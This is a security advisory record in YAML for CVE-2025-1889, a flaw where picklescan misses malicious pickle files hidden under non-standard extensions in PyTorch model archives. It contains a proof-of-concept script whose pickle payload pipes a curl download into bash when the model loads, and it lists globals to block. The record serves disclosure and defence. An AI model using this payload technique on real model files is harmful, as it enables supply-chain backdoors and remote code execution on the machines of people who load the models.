@@ -1,0 +1,155 @@
+advisory_id: GHSA-769v-p64c-89pr
+datasource_id: github_osv/GHSA-769v-p64c-89pr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-769v-p64c-89pr/GHSA-769v-p64c-89pr.json
+aliases:
+  - CVE-2025-1889
+summary: |
+  PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions
+  ### CVE-2025-1889
+
+  ### Summary
+
+  Picklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.
+
+  ### Details
+
+  Picklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.
+
+  A typical attack works as follows:
+
+  - A PyTorch model (model.pt) is created and saved normally.
+  - A second pickle file (config.p) containing a malicious payload is crafted.
+  - The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.
+  - Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.
+  - The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.
+
+  ### PoC
+  ```
+  import os
+  import pickle
+  import torch
+  import zipfile
+  from functools import partial
+
+  class RemoteCodeExecution:
+      def __reduce__(self):
+          return os.system, ("curl -s http://localhost:8080 | bash",)
+
+  # Create a directory inside the model
+  os.makedirs("model", exist_ok=True)
+
+  # Create a hidden malicious pickle file
+  with open("model/config.p", "wb") as f:
+      pickle.dump(RemoteCodeExecution(), f)
+
+  # Create a benign model
+  model = {}
+  class AutoLoad:
+      def __init__(self, path, **kwargs):
+          self.path = path
+          self.kwargs = kwargs
+
+      def __reduce__(self):
+          # Use functools.partial to create a partially applied function
+          # with torch.load and the pickle_file argument
+          return partial(torch.load, self.path, **self.kwargs), ()
+
+  model['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)
+  torch.save(model, "model.pt")
+
+  # Inject the second pickle into the model archive
+  with zipfile.ZipFile("model.pt", "a") as archive:
+      archive.write("model/config.p", "model/config.p")
+
+  # Loading the model triggers execution of config.p
+  torch.load("model.pt")
+  ```
+
+  ### Impact
+
+  Severity: High
+
+  Who is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.
+
+  What is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.
+
+  Potential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.
+
+  ### Recommendations
+
+  1. Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.
+  2. Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.
+  3. Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\x80\x05).
+  4. Block the following globals:
+          - torch.load
+          - Block functools.partial
+impacted_packages:
+  - purl: pkg:pypi/picklescan
+    affected_versions: vers:pypi/<=0.0.21
+    fixed_versions: vers:pypi/0.0.22
+    affected_packages:
+      - pkg:pypi/picklescan@0.0.1
+      - pkg:pypi/picklescan@0.0.2
+      - pkg:pypi/picklescan@0.0.3
+      - pkg:pypi/picklescan@0.0.4
+      - pkg:pypi/picklescan@0.0.5
+      - pkg:pypi/picklescan@0.0.6
+      - pkg:pypi/picklescan@0.0.7
+      - pkg:pypi/picklescan@0.0.8
+      - pkg:pypi/picklescan@0.0.9
+      - pkg:pypi/picklescan@0.0.10
+      - pkg:pypi/picklescan@0.0.11
+      - pkg:pypi/picklescan@0.0.12
+      - pkg:pypi/picklescan@0.0.13
+      - pkg:pypi/picklescan@0.0.14
+      - pkg:pypi/picklescan@0.0.15
+      - pkg:pypi/picklescan@0.0.16
+      - pkg:pypi/picklescan@0.0.17
+      - pkg:pypi/picklescan@0.0.18
+      - pkg:pypi/picklescan@0.0.19
+      - pkg:pypi/picklescan@0.0.20
+      - pkg:pypi/picklescan@0.0.21
+    fixed_packages:
+      - pkg:pypi/picklescan@0.0.22
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/mmaitre314/picklescan
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mmaitre314/picklescan
+        commit: baf03faf88fece56a89534d12ce048e5ee36e50e
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-769v-p64c-89pr/GHSA-769v-p64c-89pr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-646
+references:
+  - url: https://github.com/mmaitre314/picklescan
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/commit/baf03faf88fece56a89534d12ce048e5ee36e50e
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-1889
+    reference_type:
+    reference_id: CVE-2025-1889
+  - url: https://sites.google.com/sonatype.com/vulnerabilities/cve-2025-1889
+    reference_type:
+    reference_id: CVE-2025-1889
+  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-769v-p64c-89pr
+    reference_type:
+    reference_id: GHSA-769v-p64c-89pr
+exploits: []
